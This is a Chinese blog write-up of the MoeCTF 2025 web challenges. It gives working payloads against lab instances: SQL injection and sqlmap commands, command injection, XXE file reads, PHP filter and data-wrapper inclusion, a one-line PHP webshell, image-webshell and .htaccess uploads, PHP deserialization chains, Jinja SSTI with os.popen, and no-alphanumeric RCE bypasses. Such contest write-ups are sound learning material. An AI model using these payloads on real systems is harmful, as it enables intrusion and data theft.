---
title: "一个男人一句话改变我的一生之moectf2025"
date: "2025-10-15 15:12:52"
tags: ["ctf"]
categories: ["一个男人一句话改变我的一生"]
url: "/posts/63963.html"
abbrlink: "63963"
---

# 前言

```
当初川师范大学cssec信安组的CoHyu大师傅的一句moectf是梦开启的地方以及Sonder大师傅的moectf的题质量都很高，可以加油学学.
于是就打了moectf2025，但时间线太长了就打了一周，现在完赛了
于是打算复现一手web以及pwn部分，pwn部分就放到《每天都要pwn一点》系列了
```

# moectf2025

```
https://ctf.xidian.edu.cn/training/22
```

## web

### **0 Web入门指北**

```
你知道什么是控制台吗？快去了解一下吧！

((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......
```

#### 考点：jsfuck编码。

可以控制台解也可以解码工具解

![image-20251013223042633](/images/image-20251013223042633-1760512687698-47.png)

### **01 第一章 神秘的手镯**

```
省流：这个手镯需要输入咒语才能启封？
```

#### 预期解1考点:f12查看源码

![image-20251013223357956](/images/image-20251013223357956-1760512687698-46.png)

#### 预期解2考点:修改html

![image-20251013223817177](/images/image-20251013223817177-1760512687698-45.png)

![image-20251013223832803](/images/image-20251013223832803-1760512687698-44.png)

### **01 第一章 神秘的手镯_revenge**

#### 考点：爆破

根据hint访问/wanyanzhou.txt.bak

![image-20251015110629525](/images/image-20251015110629525-1760512687698-51.png)

要重复放500次的密码官wp说禁止了python等传输，要用bp等爆破500次就能拿到flag

### **02 第二章 初识金曦玄轨**

```
省流：你知道什么是http请求包吗？抓一个看看吧！
```

f12查看模糊的字符串，前往/golden_trail

![image-20251013224031764](/images/image-20251013224031764-1760512687698-48.png)

#### 考点：抓包

![image-20251013224913661](/images/image-20251013224913661-1760512687698-49.png)

### **03 第三章 问剑石！篡天改命！**

```
省流：仙门试炼台中央矗立着玄天剑宗至宝"问剑石"，石身流转着七彩霞光。你作为新晋弟子需测试天赋，但暗中知晓问剑石运作的玄机——其天赋判定实则通过金曦玄轨传递信息。初始测试将显示天赋：B，光芒：无，你需要施展"篡天改命"之术，修改玄轨中的关键参数，使问剑石显现天赋：S，光芒：流云状青芒(flowing_azure_clouds)的异象，从而获得宗门重视！
```

![image-20251013230410807](/images/image-20251013230410807-1760512687699-58.png)

#### 考点：get/post请求

注意post是json格式就好了

![image-20251013230448086](/images/image-20251013230448086-1760512687698-53.png)

### **04 第四章 金曦破禁与七绝傀儡阵**

```
省流：http请求有很多讲究！试试吧！
```

#### 考点：http协议

第一关

```
http://127.0.0.1:11060/stone_golem?key=xdsec
```

第二关![image-20251013231927750](/images/image-20251013231927750-1760512687698-50.png)

第三关

![image-20251013232131503](/images/image-20251013232131503-1760512687698-52.png)

第四关

![image-20251013232220770](/images/image-20251013232220770-1760512687699-54.png)

第五关

![image-20251013232344908](/images/image-20251013232344908-1760512687699-56.png)

第六关

![image-20251013232428421](/images/image-20251013232428421-1760512687699-55.png)

第七关

![image-20251013232541334](/images/image-20251013232541334-1760512687699-57.png)

全部密钥合起来base64解密即可

### **05 第五章 打上门来！**

```
省流：CTF中有一招在文件目录中穿梭的技法，是什么呢？
```

#### 考点：目录穿越

![image-20251013233525724](/images/image-20251013233525724-1760512687699-61.png)

### **06 第六章 藏经禁制？玄机初探！**

```
省流：一个登录页面。（不告诉我账号密码就让我登录，难道我是神仙吗哈哈？）
```

#### 考点：sql的万能密码登陆

![image-20251013233713280](/images/image-20251013233713280-1760512687699-60.png)

### **07 第七章 灵蛛探穴与阴阳双生符**

```
省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。
```

#### 考点：robots.txt，md5弱比较

访问/robots.txt 进入flag.php

![image-20251013234409035](/images/image-20251013234409035-1760512687699-59.png)

```
?a[]=1&b[]=2出现报错，看官wp是在php8版本下被禁用了
# 强相等
/?a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
# 弱相等
/?a=QNKCDZO&b=240610708
```

### **08 第八章 天衍真言，星图显圣**

```
省流：和上次一样的界面，那我再登录一次就行了……吗？
```

#### 考点：简单的sql注入

sqlmap的使用

```
python sqlmap.py -u "http://127.0.0.1:4858/?username=守陵人&password=周天星诀" --batch --dbs

python sqlmap.py -u "http://127.0.0.1:4858/?username=守陵人&password=周天星诀" --batch -D user --tables

python sqlmap.py -u "http://127.0.0.1:4858/?username=守陵人&password=周天星诀" --batch -D user -T flag --columns

python sqlmap.py -u "http://127.0.0.1:4858/?username=守陵人&password=周天星诀" --batch -D user -T flag --dump
```

![image-20251013235658528](/images/image-20251013235658528-1760512687700-65.png)

手测【官wp】：

```
1' UNION SELECT 1,2 #
# 回显 Welcome 1

1' union select table_name,2 from information_schema.tables where table_schema=database() #
# 回显 Welcome flag

1' union select column_name,2 from information_schema.columns where table_name='flag' #
# 回显 Welcome value

1' union select value,2 from flag #
```

![image-20251013235903297](/images/image-20251013235903297-1760512687700-64.png)

### **09 第九章 星墟禁制·天机问路**

#### 考点： URL 参数直接向服务器系统发送命令

官wp给出的php核心源码

```
<?php
$cmd = $_GET['url'];
system("nslookup " . $cmd);
```

```
?url=baidu.com;env
```

![image-20251014125213965](/images/image-20251014125213965-1760512687699-62.png)

### **10 第十章 天机符阵**

```
省流：flag在flag.txt里
```

#### 考点：xxe注入

```
<!DOCTYPE data [
  <!ENTITY abc SYSTEM "file:///var/www/html/flag.txt">
]>
<解析>&abc;</解析>
```

### **10 第十章 天机符阵_revenge**

#### 考点：`XXE`注入

flag的位置不同

```
<!DOCTYPE data [
  <!ENTITY abc SYSTEM "file:///flag.txt">
]>
<解析>&abc;</解析>
```

![image-20251015111745490](/images/image-20251015111745490-1760512687699-63.png)

### **11 第十一章 千机变·破妄之眼**

```
省流：HDdss看到了 GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。
```

#### 考点：爆破参数名，php伪协议读取文件

```
php://filter/convert.base64-encode/resource=flag.php
```

### **12 第十二章 玉魄玄关·破妄**

#### 考点：连接一句话木马

```
省流：这道题用于学习 蚁剑 的使用，请使用 蚁剑 完成本题
```

![image-20251014130414238](/images/image-20251014130414238-1760512687700-66.png)

```
cmd=system("env");
```

### 13 第十三章 通幽关·灵纹诡影

#### 考点：图片马文件上传

只过滤了jpg的文件头，做一个图片马即可，后缀都不用改

```
copy 1.jpg/b + 2.php/a 3.php

<?php @eval($_POST['cmd']);?>
```

![image-20251014132349848](/images/image-20251014132349848-1760512687700-67.png)

### **14 第十四章 御神关·补天玉碑**

```
省流：Apache有一个特殊文件，是什么呢？
```

#### 考点：.htaccess文件上传

先上传一个`.htaccess`文件,重写解析规则，当PHP文件执行就行了

```
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

然后依旧把图片马放上去就好了

![image-20251014161940352](/images/image-20251014161940352-1760512687700-70.png)

### **15 第十五章 归真关·竞时净魔**

#### 考点：条件竞争文件上传

```
省流：图片上传至/uploads
```

[【文件上传绕过】——条件竞争漏洞_条件竞争上传漏洞-CSDN博客](https://blog.csdn.net/weixin_45588247/article/details/118796606)

```
条件竞争，一边使用爆破一直高速上传一个普通木马文件，一边使用爆破访问这个木马文件。
```

### **16 第十六章 昆仑星途**

#### 考点：**文件包含漏洞**

![image-20251014162605420](/images/image-20251014162605420-1760512687700-71.png)

php伪协议的data

```
?file=data://text/plain,<?php system("ls /");?>

?file=data://text/plain,<?php system("cat /flag-OrvL3PF4K1VMXkEVzkNTMJsa8Txt7c.txt");?>
```

![image-20251014163125848](/images/image-20251014163125848-1760512687700-69.png)

### **17 第十七章 星骸迷阵·神念重构**

#### 考点：php反序列化

![image-20251014163228096](/images/image-20251014163228096-1760512687700-68.png)

```
<?php
class A {
public $a;
}

$c=new A();
$c->a="system('env');";
echo serialize($c);

?>
```

简单的反序列化 给a复制相应的命令就好了

![image-20251014164009204](/images/image-20251014164009204-1760512687700-72.png)

### **18 第十八章 万卷诡阁·功法连环**

#### 考点：php反序列化

![image-20251014164636541](/images/image-20251014164636541-1760512687700-73.png)

```
<?php
class PersonA {
    private $name;
    public function __construct($name) {
        $this->name = $name;
    }
}
class PersonB {
    public $name;
    public function __construct($name) {
        $this->name = $name;
    }
}
$code="phpinfo();";
$personB=new PersonB($code);
$personA=new PersonA($personB);
$serialized=serialize($personA);
print(urlencode($serialized));
?>
```

注意private以及函数构造

![image-20251014165356363](/images/image-20251014165356363-1760512687700-74.png)



### **19 第十九章 星穹真相·补天归源**

#### 考点php反序列化

```
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $age = $this->age;
        $name->$id($age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }
}

class PersonC extends Person
{
    public function __Check($age)
    {
        if(str_contains($this->age . $this->name,"flag"))
        {
            die("Hacker!");
        }
        $name = $this->name;
        $name($age);
    }

    public function __wakeup()
    {
        $age = $this->age;
        $name = $this->id;
        $name->age = $age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

此题多解：

```
<?php
class PersonA
{
    public $name;
    public $id;
    public $age;
}
 
class PersonB
{
    public $name;
    public $id;
    public $age;
}
 
class PersonC
{
    public $name;
    public $id;
    public $age;
}
 
$cmd = "cat /????";
 
$c = new PersonC();
$c->name = "system";
$c->id = null;
 
$a = new PersonA();
 
$a->name = $c;
$a->id = "__Check";
 
$b = new PersonB();
$b->id = $a;
$b->name = $cmd;
 
$c->id = $b;
 
echo urlencode(serialize($c));
?>
```

```
<?php
 
class Person
{
    public $name;
    public $id;
    public $age;
    public function __invoke($id)
    {
    }
}
class PersonA extends Person
{
}
class PersonB extends Person
{
}
class PersonC extends Person
{
}
$c=new PersonC();
$c->name="system";
$c->age="love";
$a=new PersonA();
$a->name=$c; 
$a->id="__Check";
$a->age="cat /f*";
$payload=serialize($a);
echo urlencode($payload);
?>
```



### **19 第十九章_revenge**

```
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

禁用了system

![image-20251015142726469](/images/image-20251015142726469-1760512687700-75.png)

[moectf 2025 writeup-CSDN博客](https://blog.csdn.net/2303_76585504/article/details/152668659)

```
<?php
  class Person{public $name,$id,$age;}
class PersonA extends Person{}
class PersonB extends Person{}
class PersonC extends Person{}
$c=new PersonC;$b=new PersonB;$a=new PersonA;
$c->name='passthru';$c->id=$b;$c->age='phantom';
$b->id=$a;$b->name='env>flag.txt';
$a->id='check';
echo urlencode(serialize($c));
```

```
<?php
class PersonA
{
    public $name;
    public $id;
    public $age;
}

class PersonB
{
    public $name;
    public $id;
    public $age;
}

class PersonC
{
    public $name;
    public $id;
    public $age;
}

$cmd = "/proc/self/environ";
$function = "file_get_contents";

$c = new PersonC();
$c->name = $function;

$a = new PersonA();

$a->name = $c;
$a->id = "check";

$b = new PersonB();
$b->id = $a;
$b->name = $cmd;

$c->id = $b;

echo urlencode(serialize($c));
?>
```



### **20 第二十章 幽冥血海·幻语心魔**

#### 考点：无限制`SSTI`

![image-20251014195214923](/images/image-20251014195214923-1760512687700-76.png)

使用的是`render_template_string()`函数动态渲染，用户可控的 `username`参数**直接拼接**到模板字符串中

![image-20251014195338347](/images/image-20251014195338347-1760512687700-77.png)

直接获得shell，查看环境变量

```
?username={{lipsum.__globals__['os']['popen']('env').read()}}&password=1
```



![image-20251014195629362](/images/image-20251014195629362-1760512687700-78.png)

### **21 第二十一章 往生漩涡·言灵死局**

#### 考点：简单限制`SSTI`

源码还是和之前的一样但是加了一个黑名单

![image-20251014195837206](/images/image-20251014195837206-1760455318317-4-1760512687700-79.png)

```
{% ... %} 代替 {{ ... }}
拼接关键字['_''_glo''bals_''_']
```

![image-20251014232940628](/images/image-20251014232940628-1760512687700-81.png)

```
?username={%print(lipsum['_''_glo''bals_''_']['os']['popen']('env').read())%}&password=1
```

### **22 第二十二章 血海核心·千年手段**

#### 考点：无回显`SSTI`

![image-20251014233417847](/images/image-20251014233417847-1760512687700-80.png)

没有将 `render_template_string` 函数的返回值赋给任何变量,即是无回显，常规的写文件到static【这里有多种解】

```
{{lipsum.__globals__['os']['popen']('mkdir static;env > ./static/out.txt')}}
```

发现flag不在环境变量里面，ls / 发现flag但是没有权限读文件

```
{{lipsum.__globals__['os']['popen']('mkdir static;find / -perm -4000> ./static/out.txt')}}
【查找具有sudi权限文件】
```

![image-20251014234711691](/images/image-20251014234711691-1760512687700-84.png)

/usr/bin/rev用于翻转字符串 但是发现无回显

```
{{lipsum.__globals__['os']['popen']('mkdir static;/usr/bin/rev /flag> ./static/out.txt')}}
```

查看能够使用的命令,发现有个rev.c文件【实则看了官wp才知道】

```
{{lipsum.__globals__['os']['popen']('mkdir static; cat /usr/bin> ./static/out.txt')}}
```

![image-20251014235714305](/images/image-20251014235714305-1760512687700-85.png)

```
{{lipsum.__globals__['os']['popen']('mkdir static;cat /usr/bin/rev.c > ./static/out.txt')}}
```

拿到源码

```
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv) {

    for(int i = 1; i + 1 < argc; i++) {
        if (strcmp("--HDdss", argv[i]) == 0) {
            execvp(argv[i + 1], &argv[i + 1]);
        }
    }

    return 0;
}
```

```
要使用--HDdss参数执行命令,就能获得flag
```

```
{{lipsum.__globals__['os']['popen']('mkdir static; /usr/bin/rev --HDdss cat /flag > ./static/out.txt')}}
```

官wp也说了，可以内存马打无回显,后面在ssti专题再去总结吧，已老实求放过

### 【未完成】**23 第二十三章 幻境迷心·皇陨星沉(大结局)**

#### 考点：java反序列化

### 24 番外篇（1）**摸金偶遇FLAG，拼尽全力难战胜**

```
玩家需要在限定时间内破译9位摩斯密码数字序列
左侧显示需要破译的摩斯密码序列
右侧提供数字键盘输入答案
每个数字对应特定的摩斯密码图案（点·和线━）
```

接受传递的数据，再post请求回去

```
fetch('/get_challenge?count=9')
.then(r => r.json())
.then(d => {
    console.log('answers:', d.numbers, 'token:', d.token);
return fetch('/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({answers: d.numbers, token: d.token})
});
})
.then(r => r.json())
.then(data => console.log('verify result:', data));
```

![image-20251015105326728](/images/image-20251015105326728-1760512687700-83.png)

### 25 番外篇（2）**这是...Webshell？**

#### 考点：无字母数字rce绕过

```
<?php
highlight_file(__FILE__);
if(isset($_GET['shell'])) {
    $shell = $_GET['shell'];
    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
        eval($shell);
    } else {
        echo "Hacker!";
    }
}
?>
```

无字母无数字的rce绕过,异或

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%aa});&%ff=system&%aa=env
```

### **26 番外篇（3）这是...Webshell?_revenge**

#### 考点：rce绕过

[无字母数字webshell之提高篇 | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

[奇安信攻防社区-RCE全覆盖总结](https://forum.butian.net/share/1048)

![image-20251015102757340](/images/image-20251015102757340-1760512687700-82.png)

```
http://127.0.0.1:7744/?shell=?><?= `. /???/????????[@-[]`?>

POST:
-----------110
Content-Disposition: form-data; name="file"; filename="1.txt"

#!/bin/sh
env
-----------110--
```

### 26 番外篇（4）**Moe笑传之猜猜爆**

生成的随机数字存储在randomnumber，直接修改或者访问都可以

![image-20251015143332428](/images/image-20251015143332428-1760512687700-86.png)

````
randomNumber = 50;
````

### 【未完成】27 番外篇（5）**附加挑战**

# 总结

```
虽然说是新生赛，反序列化啊这种知识点还是不够全面，准备开一个《重生之我要当web糕手》系列，将缺少的知识点给补上
java那一块也得，开始学开始补了，【这两题等补了java反序列化再回头看看吧】
自己还是太菜，希望省赛真的补药爆零哇，到时候大彩笔的我不敢跟大师傅们面基了都。写的不好，欢迎和师傅们交流学习
```

